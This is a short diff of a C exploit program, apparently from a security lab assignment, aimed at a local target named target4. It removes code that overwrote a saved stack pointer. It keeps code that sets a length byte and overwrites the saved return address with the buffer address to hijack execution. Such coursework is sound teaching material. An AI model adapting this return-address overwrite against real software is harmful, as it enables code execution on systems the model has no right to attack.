@@ -6,12 +6,9 @@
 
 #define TARGET "../targets/target4"
 int rip_addr = 0x2021fea8;
-int rsp1_addr = 0x2021fe90;
-int rsp2_addr = 0x2021fea0;
 int buf_addr = 0x2021fdf0;
 int i_addr = 0x2021fe98;
 int len_addr = 0x2021fe9c;
-char rsp_addr_str[] = "\xc0\xfe\x21\x20";
 char buf_addr_str[] = "\xf0\xfd\x21\x20";
 
 int main(void)
@@ -37,9 +34,6 @@ int main(void)
     // keep len as 169
     int len_pos = len_addr - buf_addr;
     exploit_str[len_pos] = '\xa9';
-
-    int rsp2_pos = rsp2_addr - buf_addr;
-    strcpy(exploit_str + rsp2_pos, rsp_addr_str);
 
     int rip_pos = rip_addr - buf_addr;
     strcpy(exploit_str + rip_pos, buf_addr_str);
